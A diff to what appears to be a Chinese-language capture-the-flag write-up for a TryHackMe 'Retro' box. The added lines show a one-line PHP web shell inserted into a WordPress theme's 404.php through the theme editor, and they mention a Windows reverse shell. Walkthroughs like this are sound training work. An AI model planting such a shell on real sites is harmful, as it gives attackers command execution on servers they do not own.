@@ -331,6 +331,15 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
 改嘗試 wordpress 登入  
 並 windows reverse shell  
+到這裡 挑一個 .php 改 我選 404.php
+```bash
+http://retro.thm/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
+```
+php 內容
+```php
+<?php system($_GET['cmd']); ?>
+```
+確認 cmd 可行
 ![alt text](image-8.png)  
 
 參考 [此網站](https://www.revshells.com) 取得 windows reverse shell  
